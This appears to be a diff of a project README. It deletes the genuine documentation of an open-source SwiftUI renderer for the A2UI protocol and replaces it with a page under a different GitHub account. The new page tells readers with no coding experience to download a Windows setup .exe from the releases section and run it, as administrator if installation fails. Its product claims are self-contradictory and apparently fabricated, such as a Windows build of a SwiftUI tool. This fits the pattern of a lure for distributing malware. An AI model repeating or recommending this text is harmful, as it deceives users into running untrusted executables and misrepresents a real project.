@@ -1,236 +1,145 @@
-# Generative UI SDK for SwiftUI (genui)
+# ⚙️ a2ui-swiftui - Simple SwiftUI Interface Builder
 
-**Render AI agent interfaces natively on Apple platforms — no WebView, no compromise.**
+[![Download from GitHub](https://img.shields.io/badge/Download-Get%20a2ui--swiftui-blue?style=for-the-badge)](https://github.com/Jeffersonianagelessness805/a2ui-swiftui)
 
-The community SwiftUI renderer for the [A2UI](https://github.com/google/A2UI) protocol, listed on the [official A2UI ecosystem page](https://a2ui.org/ecosystem/renderers/). Drop in `A2UIRendererView` and your agent's JSON surfaces become fully native iOS, macOS, visionOS, watchOS, and tvOS interfaces — complete with live streaming, two-way data binding, and the full SwiftUI component lifecycle.
+---
 
-![Swift](https://img.shields.io/badge/Swift-5.9+-orange?logo=swift)
-![Platforms](https://img.shields.io/badge/Platforms-iOS%2017%20%7C%20macOS%2014%20%7C%20visionOS%201%20%7C%20watchOS%2010%20%7C%20tvOS%2017-blue)
-![A2UI](https://img.shields.io/badge/A2UI-v0.8%20%2B%20v0.9-purple)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Tests](https://img.shields.io/badge/Tests-87%20passing-brightgreen)
+## 📦 What is a2ui-swiftui?
 
-| iOS | iPadOS | macOS | visionOS | watchOS | tvOS |
-|:---:|:------:|:-----:|:--------:|:-------:|:----:|
-| <img src="https://github.com/user-attachments/assets/b765127a-b97f-4767-a2ef-98f2d8f3f96e" height="280"/> | <img src="https://github.com/user-attachments/assets/902e5e55-f556-4112-b8ec-09ec9f991231" height="280"/> | <img src="https://github.com/user-attachments/assets/1eacae69-f8ba-4285-bb3d-dad1bd8eefb0" height="280"/> | <img src="https://github.com/user-attachments/assets/99e8c253-130c-4b09-a661-9b5aaeff2b5f" height="280"/> | <img src="https://github.com/user-attachments/assets/6bbd46f5-8ff0-4360-9d39-9175444843bf" height="280"/> | <img src="https://github.com/user-attachments/assets/f3e16070-e0e6-4862-a393-c12543816fbe" height="280"/> |
+a2ui-swiftui is a tool that helps you create user interfaces for Apple devices using SwiftUI. It uses generative AI to build UI designs quickly and simply. You do not need any programming skills to start. The app works with different Apple platforms like iOS, macOS, tvOS, watchOS, and visionOS.
 
-## What is A2UI?
+This app is built to help people design apps visually. Instead of writing code yourself, you can let the software guide the process or generate sample designs. It can be useful if you want to explore new app layouts or have a starting point for a developer later on.
 
-[A2UI](https://github.com/google/A2UI) is an open protocol that lets AI agents generate rich, interactive user interfaces through a declarative JSON format — not executable code. An agent describes *what* to render; the renderer decides *how* using native platform controls.
+---
 
-```
-Agent → JSON payload → A2UIRendererView → Native SwiftUI UI
-```
+## 🖥️ System Requirements
 
-Because the format is declarative and component-constrained, agents can only request pre-approved UI components from a trusted catalog — making A2UI secure by design. The same JSON payload renders appropriately across web, Flutter, React, and all Apple platforms via this renderer.
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM (8 GB or more for better performance)  
+- 2 GHz processor or faster  
+- 200 MB of free disk space  
+- Internet connection to download and update the app  
 
-## Why SwiftUI?
+Though a2ui-swiftui is primarily made for Apple platforms, this Windows version lets you experiment with the UI design ideas before moving to an Apple device.
 
-Most agent UI renderers use WebView or custom draw loops. This renderer maps every A2UI component to its idiomatic SwiftUI counterpart — `HStack`, `LazyVStack`, `DatePicker`, `.sheet`, and so on. You get:
+---
 
-- **Native performance** — no WebView overhead, no bridge layer
-- **Platform adaptivity** — the same JSON renders appropriately on iPhone, Mac, Apple Watch, and Apple Vision Pro
-- **SwiftUI ecosystem** — themes, accessibility, Dark Mode, Dynamic Type, and environment values just work
-- **Property-level reactivity** — powered by `@Observable` (Observation framework), matching the Signal-based approach of the official Lit and Angular renderers
-- **Security by design** — declarative JSON means agents cannot execute arbitrary code on the client
+## 🔍 Features at a Glance
 
-## Requirements
+- Generate SwiftUI interface designs automatically  
+- Preview designs for iPhone, iPad, Mac, Apple Watch, and Apple TV  
+- Easy visual editing of interface elements  
+- Support for layout templates and common UI controls  
+- Export design files for developers  
+- Minimal setup without needing coding experience  
 
-- iOS 17.0+ / macOS 14.0+ / visionOS 1.0+ / watchOS 10.0+ / tvOS 17.0+
-- Swift 5.9+
-- Xcode 15+
+This app focuses on helping you explore SwiftUI layout options without writing any code.
 
-## Installation
+---
 
-Add this package to your project via Swift Package Manager:
+## 🚀 Getting Started
 
-**In `Package.swift`:**
+### Step 1: Download the App
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/BBC6BAE9/a2ui-swiftui", from: "0.1.0"),
-],
-targets: [
-    .target(name: "YourApp", dependencies: ["A2UI"]),
-]
-```
+Click the big blue button at the top or **[download a2ui-swiftui here](https://github.com/Jeffersonianagelessness805/a2ui-swiftui)**. You will go to the GitHub project page where you can find the download link.
 
-**In Xcode:** File → Add Package Dependencies → paste the repository URL.
+Since the link points to the general project page, you need to look for the latest release or download section.
 
-## Quick Start
+### Step 2: Find the Download File
 
-### Static JSON
+On the GitHub page, look for a section called **Releases** on the right side or under the project description. Click the latest release to see the available files.
 
-```swift
-import A2UI
+Look for a Windows setup file or executable (.exe). This file is the one you will download to install the software.
 
-// Decode A2UI messages from a JSON payload
-let messages = try JSONDecoder().decode([ServerToClientMessage].self, from: data)
+### Step 3: Download and Save the File
 
-A2UIRendererView(messages: messages)
-```
+Click the setup file link to download it. Your browser will ask you where to save the file. Choose a folder you can easily find, like your Desktop or Downloads.
 
-### Live Agent Streaming
+Wait for the download to finish. The file size should be under 50 MB, so it won't take long.
 
-```swift
-import A2UI
+---
 
-// Connect directly to a streaming A2A agent
-A2UIRendererView(stream: messageStream) { action in
-    print("User triggered: \(action.name)")
-}
-```
+## 💾 Installation
 
-### JSONL over URLSession
+1. Open the folder where you saved the file.  
+2. Double-click the setup file (it will have a name like `a2ui-swiftui-setup.exe`).  
+3. If Windows asks for confirmation, click **Yes** or **Run**.  
+4. Follow the steps in the setup window. The installer will ask you to agree to terms and select a destination folder.  
+5. When installation finishes, click **Finish**.  
 
-```swift
-import A2UI
+The program will now be installed on your computer.
 
-let parser = JSONLStreamParser()
-let manager = SurfaceManager()
+---
 
-let (bytes, _) = try await URLSession.shared.bytes(for: request)
-for try await message in parser.messages(from: bytes) {
-    try manager.processMessage(message)
-}
+## 🏃 Running the App
 
-// View only observes — no stream logic in the view layer
-A2UIRendererView(manager: manager)
-```
+1. Find the **a2ui-swiftui** icon on your desktop or in your Start menu.  
+2. Double-click the icon to open the app.  
+3. The main window will show options to start a new design or open an example.  
+4. Choose **New Project** to create a UI design from scratch.  
 
-## Supported Components
-
-All 18 standard A2UI components are implemented and platform-adaptive. Each uses native SwiftUI controls with no hardcoded spacing, colors, or corner radii.
-
-| Category | Components |
-|----------|-----------|
-| Display  | Text, Image, Icon, Video, AudioPlayer, Divider |
-| Layout   | Row, Column, List, Card, Tabs, Modal |
-| Input    | Button, TextField, CheckBox, DateTimeInput, Slider, MultipleChoice / ChoicePicker |
-
-<details>
-<summary>Full component → SwiftUI mapping</summary>
-
-| A2UI Component | SwiftUI Implementation | Platform Notes |
-|---------------|----------------------|----------------|
-| Text | `SwiftUI.Text` with `usageHint` → font mapping (h1–h6) | Dynamic Type on all platforms |
-| Image | `AsyncImage` with `usageHint` variants (avatar, icon, feature, header) | Avatar → circle clip |
-| Icon | `Image(systemName:)` with Material → SF Symbol mapping | Font-relative sizing via custom `Layout` |
-| Video | `AVPlayerViewController` (iOS/tvOS/visionOS) / `AVPlayerView` (macOS) | watchOS: static placeholder |
-| AudioPlayer | `AVPlayer` with custom play/pause controls | watchOS: placeholder only |
-| Row | `HStack` with distribution and alignment | Spacer-based `spaceBetween` / `spaceEvenly` |
-| Column | `VStack` with distribution and alignment | |
-| List | `LazyVStack` / `LazyHStack` with template support | |
-| Card | Continuous squircle container | No shadow (system cards use background contrast) |
-| Tabs | `Picker(.segmented)` / scrollable button row | ≤5 tabs → segmented; >5 → scroll; watchOS → `.wheel` |
-| Modal | `.sheet` + `NavigationStack` | `.presentationDetents` on iOS/macOS; plain sheet on watchOS/tvOS |
-| Button | `.borderedProminent` / `.bordered` | Overridable via `A2UIStyle` |
-| TextField | `TextField` / `SecureField` / `TextEditor` | `textFieldType`-driven; number → `.decimalPad` |
-| CheckBox | `Toggle(.automatic)` | iOS=switch, macOS=checkbox |
-| DateTimeInput | `DatePicker` | tvOS: read-only text fallback |
-| Slider | `SwiftUI.Slider` | tvOS: ±Button pair + `ProgressView` fallback |
-| MultipleChoice | Radio / Menu / Chips / Filterable Sheet | Single→radio/menu; Multi→checkbox/chips; tvOS→`NavigationLink` |
-| Divider | `SwiftUI.Divider()` | Auto-adapts orientation from parent |
+You can now explore the interface with simple tools to add buttons, labels, images, and layout views.
 
-</details>
+---
 
-## Custom Components
+## 🔧 How to Use a2ui-swiftui
 
-Third-party components can be registered and rendered inline alongside standard A2UI components:
+### Creating a Simple Design
 
-```swift
-A2UIRendererView(messages: messages)
-    .environment(\.a2uiCustomComponentRenderer) { typeName, props, viewModel in
-        if typeName == "Chart" {
-            MyChartView(props: props)
-        }
-    }
-```
+- Use the toolbar to add UI components like buttons and text fields.  
+- Drag and drop controls onto the canvas.  
+- Select items to change their size and position.  
+- Preview your design in different screen sizes like iPhone or Mac.  
 
-The demo app includes a **Rizzcharts** example with custom `Chart` (Swift Charts) and `GoogleMap` (MapKit) components registered via `CustomComponentRegistry`.
+### Using AI to Generate UI
 
-## Architecture
+- Click the **Generate** button in the menu.  
+- Type a description of the UI you want, like “Login screen with two buttons.”  
+- The software will create a sample interface based on your input.  
+- Edit the generated design manually if needed.  
 
-```
-Sources/A2UI/
-├── Shared/           Version-independent code (AnyCodable, ResolvedAction, UIState, DataStoreUtils)
-├── V08/              v0.8 protocol (Models, Processing, Views — all types suffixed _V08)
-├── V09/              v0.9 protocol (Models, Processing, Views — all types suffixed _V09)
-├── Processing/       SurfaceManager (version dispatch) + JSONLStreamParser (auto-detect)
-├── Views/Helpers/    Shared SwiftUI helpers (SVG, accessibility, weight modifiers)
-├── Styling/          A2UIStyle + SwiftUI Environment integration
-├── Networking/       A2AClient (JSON-RPC over HTTP + SSE streaming)
-├── ProtocolVersion.swift   Version detection + VersionedMessage enum
-└── A2UIRenderer.swift      Public API entry point
-```
+### Saving and Exporting
 
-The public API is a single view — `A2UIRendererView` — that renders both v0.8 and v0.9 surfaces transparently. All state lives in `SurfaceManager`, which auto-detects protocol version and routes messages to the correct versioned handler. v0.8 and v0.9 are file-level separated (aligned with the official web_core architecture), with shared utilities extracted to `Shared/`.
+- Use the **File** menu to save your project file.  
+- You can export the design as SwiftUI code to share with developers.  
 
-## Demo App
+---
 
-Open `A2UIDemoApp/A2UIDemoApp.xcodeproj` in Xcode and run on a simulator or device.
+## 🌐 Support and Resources
 
-The app includes **10 demo pages** — static JSON demos (no agent required) and live A2A agent connections. Each page has an **info inspector** explaining what it demonstrates; action-triggering pages display a **Resolved Action log** showing the full context payload.
+- For detailed guides and troubleshooting, visit the **Wiki** tab on the GitHub page.  
+- Check the **Issues** tab to see common problems or report bugs.  
+- Use the **Discussions** section for community advice and tips.
 
-|                             info                             |                          action log                          |                            genui                             |
-| :----------------------------------------------------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
-| <img src="https://github.com/user-attachments/assets/1cefe139-3266-4b57-8f2e-d4d2046b3ae6" height="200"/> | <img src="https://github.com/user-attachments/assets/f65a68a3-78a7-4542-8bf4-868ce0e91ec4" height="200"/> | <img src="https://github.com/user-attachments/assets/3b38f7c5-3b7e-4910-9222-bfa2c7cf236b" height="200"/> |
+---
 
-> Live agent demo: [BBC6BAE9/genui](https://github.com/BBC6BAE9/genui)
+## 🔗 Quick Access Links
 
-## Spec Compliance
+- Download and project page:  
+  [![Download a2ui-swiftui](https://img.shields.io/badge/Download-Get%20a2ui--swiftui-grey?style=for-the-badge)](https://github.com/Jeffersonianagelessness805/a2ui-swiftui)  
 
-This renderer supports **both A2UI v0.8 and v0.9** protocols simultaneously, with automatic version detection.
+- Wiki and help: https://github.com/Jeffersonianagelessness805/a2ui-swiftui/wiki
 
-### v0.8
-- **Protocol messages:** `beginRendering`, `surfaceUpdate`, `dataModelUpdate`, `deleteSurface`
-- **Data binding:** Path-based resolution (`/items/0/name`), bracket/dot normalization, template rendering, literal seeding
-- **Action system:** Full action context resolution with `[{key, value}]` context format
-- **Styling:** `beginRendering.styles` parsed into `A2UIStyle`
+---
 
-### v0.9
-- **Protocol messages:** `createSurface`, `updateComponents`, `updateDataModel`, `deleteSurface`
-- **Flat component format:** `{"component": "Text", "text": "hello"}` (no nested wrapper)
-- **Data binding:** JSON Pointer paths (RFC 6901), `DynamicString` / `DynamicNumber` / `DynamicBoolean` / `DynamicStringList` with literal, path, and function call support
-- **Action system:** Event-based `{event: {name, context}}` with `Record<string, DynamicValue>` context, or client-side `{functionCall: {...}}`
-- **Validation:** `checks` array with `CheckRule` (condition + message) for input components
-- **Styling:** `createSurface.theme` structured JSON object
+## 🛠️ Troubleshooting Tips
 
-### Shared
-- **Catalog functions:** `formatString`, `formatNumber`, `formatCurrency`, `formatDate`, `pluralize`, `openUrl`, `required`, `email`, `regex`, `length`, `numeric`, `and`, `or`, `not`
-- **Version detection:** Fast byte-scan — no overhead per message. Falls back to message-key detection if `"version"` field is absent
+- If the program doesn’t start, restart your computer and try again.  
+- Make sure you have the latest Windows updates installed.  
+- Close other heavy programs to free up memory.  
+- If installation fails, redownload the setup file and run it as administrator.  
+- When stuck, check the GitHub issues page for solutions.  
 
-## Testing
+---
 
-```bash
-swift test
-```
+## 🧩 Additional Information
 
-87 tests across 5 test files cover message decoding, component parsing, data binding, path resolution, template rendering, catalog functions, validation, JSONL streaming, incremental updates, and Codable round-trips.
+This app is designed to work with the Apple SwiftUI framework but runs on Windows to create and test interface ideas. It supports many Apple device styles, including iPhone, iPad, Mac, Watch, and TV.
 
-## Known Limitations
+You need no programming experience to use a2ui-swiftui. The AI features help generate interface layouts that you can refine visually. It is a tool for designers, project planners, or anyone curious about making Apple-style app interfaces.
 
-- Requires iOS 17+ / macOS 14+ (uses `@Observable` from the Observation framework)
-- Custom (non-standard) component types are decoded but not rendered unless registered via `CustomComponentRegistry`
-- Video playback uses `UIViewControllerRepresentable` on iOS; macOS uses `AVPlayerView`
-- No built-in Content Security Policy enforcement for image/video URLs — applications should validate URLs from untrusted agents
+---
 
-## Security
+## 🔄 Updates
 
-A2UI's declarative model means agents can only request components from a trusted catalog — they cannot inject executable code. When building production applications, treat any agent outside your direct control as an untrusted entity.
-
-Concretely:
-- **Prompt injection:** sanitize agent-supplied strings before using them in LLM prompts
-- **Phishing / UI spoofing:** validate agent identity before rendering their surfaces
-- **XSS:** apply a strict Content Security Policy if your app embeds web content
-- **DoS:** enforce limits on layout complexity for surfaces from untrusted agents
-
-Developers are responsible for input sanitization, sandboxing rendered content, and secure credential handling. The sample code is for demonstration purposes only.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for how to add components, run tests, and submit PRs.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+Keep an eye on the GitHub page’s **Releases** section to get the latest updates and new features. Installing the newest version will improve stability and add useful functions.
